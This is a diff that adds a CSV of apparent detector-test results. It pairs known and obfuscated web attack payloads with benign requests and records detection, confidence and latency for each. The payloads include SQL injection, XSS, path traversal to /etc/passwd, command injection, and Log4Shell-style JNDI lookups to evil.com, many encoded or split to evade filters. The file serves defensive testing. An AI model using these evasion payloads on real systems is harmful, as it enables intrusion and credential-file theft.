@@ -1,0 +1,1203 @@
+type,payload,detected,confidence,anomaly,latency_ms
+Known SQLi,admin' OR '1'='1,True,0.9999890491343497,False,183.929
+Known XSS,<script>alert('xss')</script>,True,0.9999890491343497,False,151.857
+Known Path Traversal,../../etc/passwd,True,0.9999890491343497,False,127.561
+Known RCE,; cat /etc/passwd,True,0.9999890491343497,False,141.196
+Normal Request,GET /home HTTP/1.1,True,0.7249890491343497,False,141.547
+Zero-day #1,../../et%63/pa%73s%77%64,True,0.6670486005054224,False,144.183
+Zero-day #2,".
+.	/. .	/.
+.	/w i
+nd o
+w s /	s y s
+t	e m3
+2
+",True,0.8596203282996953,False,135.592
+Zero-day #3,../%2e%2e%2f../win%64o%77s/%73y%73%74em32,False,0.3550109508656504,False,149.655
+Zero-day #4,../../etc/passwd,True,0.9999890491343497,False,165.72
+Zero-day #5,%3b%20c%61t %2fetc/pa%73s%77d,True,0.3550109508656504,False,136.113
+Zero-day #6,; ca%74 /etc/pas%73wd,True,0.9599890491343497,False,143.558
+Zero-day #7,"'
+  UN
+I
+O	N  S
+E L	E
+CT  N U
+L	L	-
+-",True,0.6920486005054224,False,147.473
+Zero-day #8,<script>alert(1)</script>,True,0.9899890491343497,False,142.479
+Zero-day #9,'/**/UNION/**/SELECT/**/NULL--,True,0.9196203282996953,False,136.846
+Zero-day #10,<img src=x onerror=alert(1)>/**/,True,0.9449890491343497,False,178.561
+Zero-day #11,'/**/OR/**/'1'='1,True,0.9799890491343497,False,178.054
+Zero-day #12,../../etc/passwd,True,0.9999890491343497,False,166.543
+Zero-day #13,../../etc/passwd,True,0.9999890491343497,False,130.685
+Zero-day #14,../../../WiNdOWs/sYsTeM32,True,0.9999890491343497,False,149.633
+Zero-day #15,../../etc/passwd&&,True,0.9999890491343497,False,138.101
+Zero-day #16,"'	  U	N	I
+ON
+ S	E L
+E	CT  	N U
+L
+L
+--
+",True,0.6820486005054224,False,152.837
+Zero-day #17,'/**/UNION/**/SELECT/**/NULL--,True,0.9196203282996953,False,146.099
+Zero-day #18,;/**/cat/**//etc/passwd,True,0.9899890491343497,False,166.616
+Zero-day #19,.%2e/../..%2fwindows/%73yste%6d3%32,False,0.3750109508656504,False,159.193
+Zero-day #20,' UNION SELECT NULL----,True,0.9999890491343497,False,147.144
+Zero-day #21,$%7bjndi%3al%64ap%3a%2f/%65vil%2ec%6fm},False,0.3200109508656504,False,159.399
+Zero-day #22,%24%7bjnd%69:%6cdap%3a/%2f%65v%69l.com},False,0.3200109508656504,False,143.421
+Zero-day #23,${jndi:ldap://evil.com}&&,True,0.3700109508656504,False,140.713
+Zero-day #24,%3cscr%69pt>a%6ce%72%74(1)<%2fscript%3e,True,0.9149890491343496,False,140.999
+Zero-day #25,${jndi:ldap://evil.com}/**/,False,0.38024347310429957,False,163.621
+Zero-day #26,<script>alert(1)</script>;,True,0.9649890491343497,False,164.093
+Zero-day #27,".
+.
+/.	./ e t c
+/
+pa	s
+s
+w	d
+",True,0.6620486005054225,False,146.663
+Zero-day #28,../../etc/passwd--,True,0.9999890491343497,False,133.368
+Zero-day #29,../../ETC/PaSSWd,True,0.9999890491343497,False,123.517
+Zero-day #30,' UNION SELECT NULL--&&,True,0.9999890491343497,False,140.577
+Zero-day #31,<img src=x onerror=alert(1)>&&,True,0.9949890491343496,False,159.884
+Zero-day #32,../../../windows/system32,True,0.9999890491343497,False,172.339
+Zero-day #33,${jndi:ldap://evil.com}/**/,False,0.38024347310429957,False,130.434
+Zero-day #34,<img/**/src=x/**/onerror=alert(1)>,True,0.9549890491343497,False,130.012
+Zero-day #35,..%2f.%2e%2f%65tc/%70asswd,True,0.4150109508656504,False,133.984
+Zero-day #36,"' 
+UNIO
+N  
+S E
+L	E	C T
+ 	NU	L
+L
+-
+-	",True,0.6920486005054224,False,133.852
+Zero-day #37,${jndi:LdAp://EVil.COM},True,0.9049890491343497,False,129.982
+Zero-day #38,<i%6dg src=%78 oner%72%6f%72=al%65%72%74(1)>,True,0.9049890491343497,False,145.32
+Zero-day #39,../../etc/passwd,True,0.9999890491343497,False,138.236
+Zero-day #40,'/**/OR/**/'1'='1,True,0.9799890491343497,False,145.034
+Zero-day #41,"< im g  
+s r	c	=	x	 
+o n	e
+rr	o r	=ale	rt(1 )
+>
+",False,0.4050109508656504,False,132.986
+Zero-day #42,' UniON sElECT nUll--,True,0.9999890491343497,False,134.304
+Zero-day #43,%27 %55NION SELECT%20NULL--,True,0.41001095086565037,False,127.691
+Zero-day #44,;/**/cat/**//etc/passwd,True,0.9899890491343497,False,148.258
+Zero-day #45,; cat%20/e%74%63%2fpassw%64,True,0.3700109508656504,False,172.119
+Zero-day #46,<%69m%67%20%73rc=%78 onerror=ale%72t(1)%3e,False,0.3900109508656504,False,136.66
+Zero-day #47,' %55N%49ON SELE%43%54 %4eUL%4c--,False,0.4500109508656504,False,154.171
+Zero-day #48,%27 OR%20%271'=%271,True,0.9899890491343497,False,192.057
+Zero-day #49,' OR%20'1%27='1,True,0.9999890491343497,False,164.589
+Zero-day #50,"${ j
+n di:	l dap : /
+/ e
+vi
+l	.
+c
+om}	",False,0.3050109508656504,False,159.049
+Zero-day #51,%27 %55NI%4fN S%45LE%43T NU%4c%4c-%2d,False,0.4150109508656504,False,128.732
+Zero-day #52,'/**/OR/**/'1'='1,True,0.9799890491343497,False,100.192
+Zero-day #53,' U%4eIO%4e%20S%45LE%43%54%20%4e%55%4cL--,True,0.6820486005054224,False,82.483
+Zero-day #54,../../../windows/system32,True,0.9999890491343497,False,112.354
+Zero-day #55,${jNdi:ldap://EVil.COm},True,0.9049890491343497,False,96.368
+Zero-day #56,${j%6edi:%6c%64a%70%3a/%2f%65%76%69%6c.%63om%7d,False,0.3100109508656504,False,151.585
+Zero-day #57,'/**/UNION/**/SELECT/**/NULL--,True,0.9196203282996953,False,74.893
+Zero-day #58,' Or '1'='1,True,0.9999890491343497,False,82.593
+Zero-day #59,%2e.%2f%2e./.%2e/%77in%64ows%2f%73ys%74em32,False,0.3600109508656504,False,79.74
+Zero-day #60,${jndi:%6cda%70://evi%6c.c%6fm%7d,False,0.3400109508656504,False,70.15
+Zero-day #61,<img src=x onerror=alert(1)>;,True,0.9999890491343497,False,80.33
+Zero-day #62,; cat /etc/passwd/**/,True,0.9899890491343497,False,81.792
+Zero-day #63,../../../windows/system32,True,0.9999890491343497,False,75.912
+Zero-day #64,' OR%20%271%27%3d'%31,True,0.9999890491343497,False,77.529
+Zero-day #65,"<
+i
+m	g
+ 
+s	r	c
+=x	 	o	n	err o r
+=	a
+le	r	t
+(
+1 )>	",False,0.4400109508656504,False,86.205
+Zero-day #66,../../ETC/PaSSWd,True,0.9999890491343497,False,82.084
+Zero-day #67,<i%6dg%20s%72c=x%20on%65rro%72%3d%61lert(1%29>,False,0.3850109508656504,False,87.454
+Zero-day #68,<script>alert(1)</script>,True,0.9899890491343497,False,93.423
+Zero-day #69,${jndi:ldap://evil.com};,True,0.8999890491343496,False,80.464
+Zero-day #70,"< i	m	g
+ 
+s r	c	=	x 
+o
+ne	r	r	o	r	=	a
+l e rt	( 1)	>",False,0.4450109508656504,False,87.409
+Zero-day #71,' OR '1'='1,True,0.9999890491343497,False,90.655
+Zero-day #72,.%2e%2f%2e%2e/e%74c/pas%73%77d,True,0.6620486005054225,False,90.787
+Zero-day #73,<img src=x onerror=alert(1)>&&,True,0.9949890491343496,False,82.448
+Zero-day #74,;/**/cat/**//etc/passwd,True,0.9899890491343497,False,88.92
+Zero-day #75,<script>alert(1)</script>&&,True,0.9649890491343497,False,95.402
+Zero-day #76,' UNION SELECT NULL--&&,True,0.9999890491343497,False,85.021
+Zero-day #77,<img src=x onerror=alert(1)>--,True,0.9949890491343496,False,83.833
+Zero-day #78,../../EtC/pASswD,True,0.9999890491343497,False,117.981
+Zero-day #79,%2e.%2f%2e.%2f..%2fwindo%77%73%2f%73ystem3%32,True,0.6620486005054225,False,95.611
+Zero-day #80,%3b %63at %2f%65t%63/p%61ss%77d,False,0.4150109508656504,False,92.383
+Zero-day #81,' Or '1'='1,True,0.9999890491343497,False,94.917
+Zero-day #82,<script>alert(1)</script>;,True,0.9649890491343497,False,92.283
+Zero-day #83,"<	i m g   s
+rc=x   o n
+e rr
+or	=
+a l	e
+rt
+(
+1	)> ",False,0.4400109508656504,False,102.498
+Zero-day #84,../../etc/passwd||,True,0.9999890491343497,False,102.28
+Zero-day #85,".	./	.	. /	.	./	wi n do	w s /
+s
+y
+s	t em3	2
+",True,0.8596203282996953,False,95.392
+Zero-day #86,../../etc/passwd,True,0.9999890491343497,False,126.49
+Zero-day #87,' OR '1'='1&&,True,0.9999890491343497,False,98.703
+Zero-day #88,${j%6ed%69:l%64ap%3a%2f/e%76%69%6c.c%6fm},False,0.3300109508656504,False,107.178
+Zero-day #89,; caT /eTC/PasSwd,True,0.9999890491343497,False,90.38
+Zero-day #90,../../../wINDoWS/syStEm32,True,0.9999890491343497,False,82.979
+Zero-day #91,' UNION SELECT NULL--&&,True,0.9999890491343497,False,99.102
+Zero-day #92,<%69mg s%72c=%78 onerro%72=%61%6cert(1)%3e,False,0.3900109508656504,False,100.095
+Zero-day #93,' U%4eI%4fN SELE%43T NUL%4c%2d-,True,0.4250109508656504,False,99.575
+Zero-day #94,"../ . .
+/
+e
+t
+c
+/p
+as
+sw d
+",True,0.6670486005054224,False,99.495
+Zero-day #95,'/**/OR/**/'1'='1,True,0.9799890491343497,False,83.455
+Zero-day #96,"'  
+UNIO
+N  SEL E
+C T 
+N
+UL L
+-
+- ",True,0.7070486005054224,False,110.571
+Zero-day #97,<img src=x onerror=alert(1)>&&,True,0.9949890491343496,False,101.801
+Zero-day #98,"<
+s	cr	i	pt>
+al e
+r t(1 )</
+s c
+ri	p	t> ",True,0.8999890491343496,False,101.144
+Zero-day #99,". .
+/ .
+.
+/e	t	c	/ p a s	s	w
+d
+",True,0.6620486005054225,False,100.453
+Zero-day #100,%27 OR '1'='1,True,0.9999890491343497,False,111.471
+Benign #1,POST /api/users/641,True,0.6749890491343497,False,107.611
+Benign #2,POST /api/users/520,True,0.6749890491343497,False,86.25
+Benign #3,GET /search?q=aTuNiImirZ,False,0.18001095086565036,False,98.375
+Benign #4,POST /api/users/760,True,0.6749890491343497,False,84.301
+Benign #5,GET /contact.html,True,0.7849890491343496,False,115.284
+Benign #6,POST /api/users/593,True,0.6749890491343497,False,107.192
+Benign #7,POST /form data=52,True,0.8199890491343497,False,102.027
+Benign #8,GET /search?q=liJKzJwz,True,0.7199890491343497,False,122.1
+Benign #9,GET /search?q=ESqhGarqlI,False,0.18501095086565036,False,109.111
+Benign #10,POST /api/users/605,True,0.6749890491343497,False,101.443
+Benign #11,POST /api/users/876,True,0.6749890491343497,False,82.921
+Benign #12,GET /products.html,True,0.7149890491343497,False,100.19
+Benign #13,POST /api/users/334,True,0.7349890491343496,False,90.984
+Benign #14,GET /home.html,True,0.7949890491343496,False,86.1
+Benign #15,POST /api/users/380,True,0.6749890491343497,False,115.719
+Benign #16,GET /search?q=vZgFdmAb,True,0.7149890491343497,False,87.49
+Benign #17,GET /search?q=rICYhkVCzw,False,0.17001095086565038,False,79.482
+Benign #18,GET /search?q=lKfbLD,True,0.7399890491343497,False,76.335
+Benign #19,POST /api/users/796,True,0.6749890491343497,False,79.547
+Benign #20,POST /api/users/317,True,0.6749890491343497,False,81.713
+Benign #21,GET /services.html,True,0.7199890491343497,False,85.029
+Benign #22,GET /about.html,True,0.7599890491343497,False,73.182
+Benign #23,POST /form data=45,True,0.8199890491343497,False,80.957
+Benign #24,GET /about.html,True,0.7599890491343497,False,85.872
+Benign #25,GET /contact.html,True,0.7849890491343496,False,116.123
+Benign #26,POST /form data=99,True,0.8849890491343497,False,84.315
+Benign #27,POST /form data=62,True,0.8199890491343497,False,77.702
+Benign #28,GET /services.html,True,0.7199890491343497,False,87.115
+Benign #29,POST /form data=34,True,0.8199890491343497,False,80.375
+Benign #30,GET /about.html,True,0.7599890491343497,False,80.791
+Benign #31,GET /about.html,True,0.7599890491343497,False,86.528
+Benign #32,GET /about.html,True,0.7599890491343497,False,82.2
+Benign #33,POST /api/users/325,True,0.6749890491343497,False,80.855
+Benign #34,POST /form data=54,True,0.8199890491343497,False,90.395
+Benign #35,POST /api/users/626,True,0.7349890491343496,False,82.836
+Benign #36,POST /form data=72,True,0.8199890491343497,False,75.994
+Benign #37,POST /api/users/801,True,0.6749890491343497,False,106.109
+Benign #38,POST /api/users/339,True,0.7349890491343496,False,86.809
+Benign #39,POST /form data=74,True,0.8199890491343497,False,101.896
+Benign #40,POST /api/users/721,True,0.6749890491343497,False,98.622
+Benign #41,GET /products.html,True,0.7149890491343497,False,87.745
+Benign #42,GET /search?q=kCWC ,True,0.7499890491343497,False,98.609
+Benign #43,POST /form data=88,True,0.8849890491343497,False,81.914
+Benign #44,POST /form data=12,True,0.8199890491343497,False,78.12
+Benign #45,POST /form data=98,True,0.8199890491343497,False,74.617
+Benign #46,POST /form data=38,True,0.8199890491343497,False,117.565
+Benign #47,GET /search?q=dBVXhEXRRpfmc,False,0.17001095086565038,False,81.476
+Benign #48,POST /form data=72,True,0.8199890491343497,False,86.488
+Benign #49,GET /search?q=qxvWZw,True,0.7499890491343497,False,73.261
+Benign #50,POST /form data=10,True,0.8199890491343497,False,79.964
+Benign #51,GET /about.html,True,0.7599890491343497,False,78.781
+Benign #52,GET /home.html,True,0.7949890491343496,False,86.402
+Benign #53,GET /search?q=DuLsWYyfAdlhGM,False,0.17001095086565038,False,80.674
+Benign #54,GET /about.html,True,0.7599890491343497,False,74.632
+Benign #55,POST /api/users/787,True,0.7349890491343496,False,83.512
+Benign #56,GET /products.html,True,0.7149890491343497,False,74.916
+Benign #57,POST /form data=87,True,0.8199890491343497,False,76.555
+Benign #58,POST /api/users/676,True,0.7349890491343496,False,80.832
+Benign #59,POST /form data=38,True,0.8199890491343497,False,76.41
+Benign #60,GET /products.html,True,0.7149890491343497,False,87.306
+Benign #61,POST /form data=52,True,0.8199890491343497,False,86.172
+Benign #62,POST /form data=83,True,0.8199890491343497,False,80.039
+Benign #63,POST /form data=1,True,0.8799890491343496,False,77.603
+Benign #64,GET /search?q=NlkufJPzLdJ,False,0.17001095086565038,False,81.577
+Benign #65,GET /about.html,True,0.7599890491343497,False,91.887
+Benign #66,POST /api/users/289,True,0.6749890491343497,False,79.46
+Benign #67,GET /search?q=CLvktFshiBZvt,False,0.17001095086565038,False,94.29
+Benign #68,POST /api/users/841,True,0.6749890491343497,False,78.856
+Benign #69,POST /form data=87,True,0.8199890491343497,False,93.88
+Benign #70,GET /search?q=QwYTHboaXGqyt,False,0.17001095086565038,False,94.852
+Benign #71,POST /form data=14,True,0.8199890491343497,False,99.74
+Benign #72,POST /api/users/210,True,0.6749890491343497,False,87.429
+Benign #73,POST /api/users/52,True,0.7349890491343496,False,93.758
+Benign #74,GET /search?q=YQQfF,True,0.7499890491343497,False,107.847
+Benign #75,GET /contact.html,True,0.7849890491343496,False,116.521
+Benign #76,GET /search?q=IiWJoMnDBiJu,False,0.17001095086565038,False,114.46
+Benign #77,GET /search?q=fImLdd tQbmVhskqie,False,0.17001095086565038,False,116.678
+Benign #78,POST /form data=65,True,0.8199890491343497,False,87.822
+Benign #79,GET /search?q=ltoJW cjYeenwM Bcno,False,0.16501095086565037,False,127.057
+Benign #80,GET /search?q=TdMXzVE,True,0.7249890491343497,False,117.727
+Benign #81,GET /search?q=RljyvJOsQQzYhhVeQM,False,0.17001095086565038,False,98.782
+Benign #82,GET /contact.html,True,0.7849890491343496,False,88.848
+Benign #83,GET /services.html,True,0.7199890491343497,False,101.164
+Benign #84,GET /search?q=gxSmNQij,True,0.7149890491343497,False,111.402
+Benign #85,POST /form data=72,True,0.8199890491343497,False,105.873
+Benign #86,GET /search?q=bEbSqnmJJpOZfOgI,False,0.16501095086565037,False,104.483
+Benign #87,POST /form data=31,True,0.8199890491343497,False,113.144
+Benign #88,POST /form data=28,True,0.8199890491343497,False,94.638
+Benign #89,GET /products.html,True,0.7149890491343497,False,88.469
+Benign #90,GET /home.html,True,0.7949890491343496,False,97.147
+Benign #91,POST /api/users/167,True,0.6749890491343497,False,91.717
+Benign #92,POST /form data=37,True,0.8199890491343497,False,86.88
+Benign #93,POST /api/users/6,True,0.7449890491343496,False,109.152
+Benign #94,GET /home.html,True,0.7949890491343496,False,83.22
+Benign #95,POST /api/users/420,True,0.6749890491343497,False,108.395
+Benign #96,POST /api/users/352,True,0.6749890491343497,False,96.137
+Benign #97,GET /services.html,True,0.7199890491343497,False,110.634
+Benign #98,POST /form data=58,True,0.8199890491343497,False,109.009
+Benign #99,GET /products.html,True,0.7149890491343497,False,93.957
+Benign #100,POST /api/users/115,True,0.7349890491343496,False,109.69
+Benign #101,GET /products.html,True,0.7149890491343497,False,98.632
+Benign #102,GET /search?q=NxjVVtehNHlol,False,0.17001095086565038,False,101.816
+Benign #103,POST /form data=87,True,0.8199890491343497,False,84.125
+Benign #104,GET /search?q=VEEcTCSF,True,0.7249890491343497,False,78.016
+Benign #105,GET /search?q=GsDqiZCVlfrnpzsC,False,0.16501095086565037,False,93.486
+Benign #106,POST /api/users/73,True,0.7349890491343496,False,102.84
+Benign #107,POST /api/users/250,True,0.6749890491343497,False,121.979
+Benign #108,POST /api/users/557,True,0.7349890491343496,False,93.545
+Benign #109,GET /search?q=MwxtaEQnBplgK,False,0.17001095086565038,False,104.327
+Benign #110,POST /api/users/818,True,0.7349890491343496,False,97.388
+Benign #111,POST /form data=59,True,0.8199890491343497,False,82.227
+Benign #112,GET /search?q=DTSHH,True,0.7499890491343497,False,74.463
+Benign #113,POST /form data=58,True,0.8199890491343497,False,75.389
+Benign #114,GET /search?q=YozkwrIHyRGNdxjnpi,False,0.17001095086565038,False,73.422
+Benign #115,POST /form data=29,True,0.8199890491343497,False,69.747
+Benign #116,GET /products.html,True,0.7149890491343497,False,77.947
+Benign #117,GET /search?q=nsQTIpxJRXZU,False,0.17001095086565038,False,69.092
+Benign #118,GET /products.html,True,0.7149890491343497,False,74.194
+Benign #119,POST /api/users/993,True,0.7349890491343496,False,75.707
+Benign #120,GET /home.html,True,0.7949890491343496,False,75.397
+Benign #121,GET /search?q=tT fgcnFbJAfSdBCWq,False,0.17001095086565038,False,80.227
+Benign #122,POST /api/users/951,True,0.6749890491343497,False,75.832
+Benign #123,POST /form data=55,True,0.8849890491343497,False,74.864
+Benign #124,POST /api/users/446,True,0.7349890491343496,False,78.058
+Benign #125,POST /api/users/100,True,0.7349890491343496,False,82.06
+Benign #126,POST /form data=65,True,0.8199890491343497,False,91.398
+Benign #127,POST /api/users/366,True,0.7349890491343496,False,76.535
+Benign #128,GET /home.html,True,0.7949890491343496,False,75.436
+Benign #129,GET /about.html,True,0.7599890491343497,False,79.946
+Benign #130,GET /contact.html,True,0.7849890491343496,False,80.264
+Benign #131,GET /about.html,True,0.7599890491343497,False,88.936
+Benign #132,GET /search?q=EmKizeXrn,True,0.7199890491343497,False,119.917
+Benign #133,GET /contact.html,True,0.7849890491343496,False,108.471
+Benign #134,POST /api/users/1,True,0.7449890491343496,False,89.701
+Benign #135,POST /api/users/213,True,0.6749890491343497,False,86.699
+Benign #136,GET /products.html,True,0.7149890491343497,False,91.005
+Benign #137,GET /about.html,True,0.7599890491343497,False,86.482
+Benign #138,POST /form data=57,True,0.8199890491343497,False,88.46
+Benign #139,POST /form data=48,True,0.8199890491343497,False,110.852
+Benign #140,POST /form data=97,True,0.8199890491343497,False,76.679
+Benign #141,GET /search?q=nXhgm,True,0.7499890491343497,False,82.488
+Benign #142,POST /api/users/700,True,0.7349890491343496,False,71.042
+Benign #143,GET /search?q=g AcEsVRy,True,0.7249890491343497,False,81.529
+Benign #144,POST /api/users/300,True,0.7349890491343496,False,80.531
+Benign #145,POST /api/users/234,True,0.6749890491343497,False,81.204
+Benign #146,GET /contact.html,True,0.7849890491343496,False,74.359
+Benign #147,GET /search?q=ZlIUGwRwMrP,False,0.17001095086565038,False,78.911
+Benign #148,POST /form data=32,True,0.8199890491343497,False,85.302
+Benign #149,GET /search?q=giQwzIkynDcqLUdMv,False,0.17001095086565038,False,77.851
+Benign #150,POST /api/users/369,True,0.6749890491343497,False,76.341
+Benign #151,GET /products.html,True,0.7149890491343497,False,76.102
+Benign #152,POST /api/users/560,True,0.6749890491343497,False,77.194
+Benign #153,POST /form data=93,True,0.8199890491343497,False,96.868
+Benign #154,POST /form data=15,True,0.8199890491343497,False,75.514
+Benign #155,POST /form data=66,True,0.8849890491343497,False,79.643
+Benign #156,POST /api/users/299,True,0.7349890491343496,False,75.63
+Benign #157,GET /services.html,True,0.7199890491343497,False,87.449
+Benign #158,GET /search?q=MaLbFSBZd ODZoPElGQt,False,0.16501095086565037,False,80.783
+Benign #159,GET /search?q=dOZxZaqgdA,False,0.18001095086565036,False,81.081
+Benign #160,POST /api/users/369,True,0.6749890491343497,False,125.916
+Benign #161,GET /search?q=rsobmtW,True,0.7249890491343497,False,78.867
+Benign #162,GET /services.html,True,0.7199890491343497,False,121.786
+Benign #163,POST /api/users/28,True,0.7349890491343496,False,103.139
+Benign #164,POST /form data=25,True,0.8199890491343497,False,96.762
+Benign #165,POST /form data=3,True,0.8799890491343496,False,100.524
+Benign #166,GET /home.html,True,0.7949890491343496,False,89.902
+Benign #167,GET /home.html,True,0.7949890491343496,False,91.235
+Benign #168,GET /home.html,True,0.7949890491343496,False,86.538
+Benign #169,GET /services.html,True,0.7199890491343497,False,93.042
+Benign #170,POST /api/users/699,True,0.7349890491343496,False,118.57
+Benign #171,POST /form data=44,True,0.8849890491343497,False,114.012
+Benign #172,GET /search?q=rWJx VopiMLDUx,False,0.17001095086565038,False,109.799
+Benign #173,GET /contact.html,True,0.7849890491343496,False,108.718
+Benign #174,GET /search?q=MPmEuwpt,True,0.7149890491343497,False,86.526
+Benign #175,POST /form data=23,True,0.8199890491343497,False,119.422
+Benign #176,POST /form data=95,True,0.8199890491343497,False,98.196
+Benign #177,GET /contact.html,True,0.7849890491343496,False,101.201
+Benign #178,POST /form data=60,True,0.8199890491343497,False,85.222
+Benign #179,POST /api/users/987,True,0.6749890491343497,False,114.789
+Benign #180,GET /home.html,True,0.7949890491343496,False,88.804
+Benign #181,GET /search?q=eZRJPzDXffPrFpGi,False,0.16501095086565037,False,89.043
+Benign #182,GET /search?q=FWHANkQEkloUMtsFvz,False,0.17001095086565038,False,85.961
+Benign #183,POST /api/users/995,True,0.7349890491343496,False,88.877
+Benign #184,POST /form data=98,True,0.8199890491343497,False,110.449
+Benign #185,POST /form data=65,True,0.8199890491343497,False,98.312
+Benign #186,GET /search?q=wfkTWB NIhYRIT,False,0.17001095086565038,False,100.624
+Benign #187,POST /api/users/220,True,0.7349890491343496,False,100.809
+Benign #188,GET /search?q=jGHSfIPcIyzMuGLu,False,0.16501095086565037,False,88.197
+Benign #189,GET /search?q=FhD ltGWBb,False,0.17001095086565038,False,99.437
+Benign #190,GET /search?q=UoQoznmBMldW,False,0.17001095086565038,False,86.971
+Benign #191,POST /form data=21,True,0.8199890491343497,False,92.569
+Benign #192,GET /search?q=dstHCmrsrcujucv,False,0.17001095086565038,False,96.496
+Benign #193,GET /home.html,True,0.7949890491343496,False,105.047
+Benign #194,POST /form data=90,True,0.8199890491343497,False,105.688
+Benign #195,POST /form data=53,True,0.8199890491343497,False,96.481
+Benign #196,GET /services.html,True,0.7199890491343497,False,82.46
+Benign #197,POST /api/users/578,True,0.6749890491343497,False,82.614
+Benign #198,GET /about.html,True,0.7599890491343497,False,81.922
+Benign #199,GET /about.html,True,0.7599890491343497,False,106.947
+Benign #200,POST /api/users/904,True,0.6749890491343497,False,113.611
+Benign #201,GET /search?q=jAlyjZIQDbxoLagBT,False,0.17001095086565038,False,107.678
+Benign #202,GET /contact.html,True,0.7849890491343496,False,90.344
+Benign #203,GET /products.html,True,0.7149890491343497,False,81.914
+Benign #204,GET /about.html,True,0.7599890491343497,False,79.689
+Benign #205,GET /services.html,True,0.7199890491343497,False,81.293
+Benign #206,GET /home.html,True,0.7949890491343496,False,87.716
+Benign #207,GET /search?q=MaGkrPJQED,False,0.18001095086565036,False,75.024
+Benign #208,GET /home.html,True,0.7949890491343496,False,78.066
+Benign #209,GET /home.html,True,0.7949890491343496,False,62.533
+Benign #210,POST /api/users/785,True,0.6749890491343497,False,52.891
+Benign #211,GET /search?q=UIUUT,True,0.7599890491343497,False,38.653
+Benign #212,POST /form data=3,True,0.8799890491343496,False,39.67
+Benign #213,POST /form data=81,True,0.8199890491343497,False,37.967
+Benign #214,GET /search?q=jCbYJNDoDwJfCZ,False,0.17001095086565038,False,40.319
+Benign #215,POST /api/users/607,True,0.6749890491343497,False,39.442
+Benign #216,POST /api/users/771,True,0.7349890491343496,False,35.606
+Benign #217,GET /search?q=qkXfPmD,True,0.7199890491343497,False,50.325
+Benign #218,GET /contact.html,True,0.7849890491343496,False,45.727
+Benign #219,GET /products.html,True,0.7149890491343497,False,34.872
+Benign #220,POST /form data=56,True,0.8199890491343497,False,69.793
+Benign #221,GET /search?q=YrMmmFVeenUYN,False,0.17001095086565038,False,76.072
+Benign #222,POST /form data=29,True,0.8199890491343497,False,88.008
+Benign #223,POST /api/users/429,True,0.6749890491343497,False,111.345
+Benign #224,GET /home.html,True,0.7949890491343496,False,127.207
+Benign #225,GET /search?q=lpAjHen,True,0.7199890491343497,False,108.358
+Benign #226,POST /form data=36,True,0.8199890491343497,False,78.028
+Benign #227,POST /api/users/512,True,0.6749890491343497,False,95.695
+Benign #228,POST /api/users/352,True,0.6749890491343497,False,116.257
+Benign #229,POST /form data=64,True,0.8199890491343497,False,103.265
+Benign #230,POST /form data=76,True,0.8199890491343497,False,105.104
+Benign #231,POST /form data=3,True,0.8799890491343496,False,83.988
+Benign #232,GET /search?q=yGhlxkhooIwrBu,False,0.17001095086565038,False,80.558
+Benign #233,POST /form data=35,True,0.8199890491343497,False,78.902
+Benign #234,GET /home.html,True,0.7949890491343496,False,83.347
+Benign #235,POST /api/users/452,True,0.6749890491343497,False,85.274
+Benign #236,GET /products.html,True,0.7149890491343497,False,86.586
+Benign #237,GET /home.html,True,0.7949890491343496,False,81.009
+Benign #238,GET /search?q=cXUYlcvoraISvYXkoBnJ,False,0.16501095086565037,False,84.344
+Benign #239,GET /search?q=tVzCWsTpKY,False,0.17001095086565038,False,94.977
+Benign #240,POST /api/users/594,True,0.6749890491343497,False,90.465
+Benign #241,POST /api/users/69,True,0.7349890491343496,False,90.085
+Benign #242,POST /form data=75,True,0.8199890491343497,False,85.119
+Benign #243,GET /home.html,True,0.7949890491343496,False,83.653
+Benign #244,GET /about.html,True,0.7599890491343497,False,78.463
+Benign #245,GET /home.html,True,0.7949890491343496,False,89.557
+Benign #246,POST /form data=67,True,0.8199890491343497,False,82.754
+Benign #247,POST /api/users/709,True,0.6749890491343497,False,83.023
+Benign #248,POST /api/users/111,True,0.7499890491343497,False,83.444
+Benign #249,POST /api/users/960,True,0.6749890491343497,False,81.768
+Benign #250,POST /api/users/439,True,0.6749890491343497,False,87.974
+Benign #251,GET /home.html,True,0.7949890491343496,False,78.777
+Benign #252,GET /services.html,True,0.7199890491343497,False,87.529
+Benign #253,GET /home.html,True,0.7949890491343496,False,87.054
+Benign #254,POST /api/users/404,True,0.7349890491343496,False,117.71
+Benign #255,GET /search?q=HxdQjXO,True,0.7149890491343497,False,159.138
+Benign #256,GET /products.html,True,0.7149890491343497,False,173.163
+Benign #257,GET /search?q=WrxMGQZCkVWZklIxE,False,0.17001095086565038,False,205.74
+Benign #258,POST /form data=27,True,0.8199890491343497,False,177.376
+Benign #259,POST /api/users/419,True,0.6749890491343497,False,174.991
+Benign #260,GET /search?q=FrdywFu,True,0.7249890491343497,False,161.403
+Benign #261,GET /search?q=wDMPwVXnIWhBr,False,0.17001095086565038,False,183.614
+Benign #262,POST /form data=98,True,0.8199890491343497,False,165.887
+Benign #263,POST /form data=9,True,0.8799890491343496,False,147.044
+Benign #264,POST /form data=18,True,0.8199890491343497,False,144.998
+Benign #265,GET /products.html,True,0.7149890491343497,False,140.631
+Benign #266,POST /form data=4,True,0.8799890491343496,False,137.485
+Benign #267,POST /form data=14,True,0.8199890491343497,False,127.751
+Benign #268,POST /api/users/536,True,0.6749890491343497,False,115.256
+Benign #269,GET /services.html,True,0.7199890491343497,False,131.842
+Benign #270,POST /api/users/242,True,0.7349890491343496,False,125.929
+Benign #271,GET /search?q=guyuopLdtdoarmFL ,False,0.17001095086565038,False,143.843
+Benign #272,GET /search?q=CYsaO,True,0.7499890491343497,False,135.905
+Benign #273,GET /search?q=MwJMLOj,True,0.7199890491343497,False,140.867
+Benign #274,GET /search?q=XbwDokQiJGpWxKpv S,False,0.17001095086565038,False,129.834
+Benign #275,GET /products.html,True,0.7149890491343497,False,134.234
+Benign #276,GET /search?q=kDIPKKIBGppccIZDSa,False,0.17001095086565038,False,128.81
+Benign #277,GET /services.html,True,0.7199890491343497,False,121.427
+Benign #278,GET /services.html,True,0.7199890491343497,False,126.39
+Benign #279,POST /api/users/956,True,0.6749890491343497,False,111.297
+Benign #280,GET /search?q=ItyAmakPUdv,False,0.17001095086565038,False,116.055
+Benign #281,POST /api/users/156,True,0.6749890491343497,False,130.687
+Benign #282,POST /form data=73,True,0.8199890491343497,False,138.696
+Benign #283,POST /form data=58,True,0.8199890491343497,False,132.241
+Benign #284,POST /api/users/307,True,0.6749890491343497,False,139.769
+Benign #285,GET /home.html,True,0.7949890491343496,False,122.81
+Benign #286,GET /products.html,True,0.7149890491343497,False,129.437
+Benign #287,POST /api/users/959,True,0.7349890491343496,False,140.438
+Benign #288,POST /form data=15,True,0.8199890491343497,False,123.639
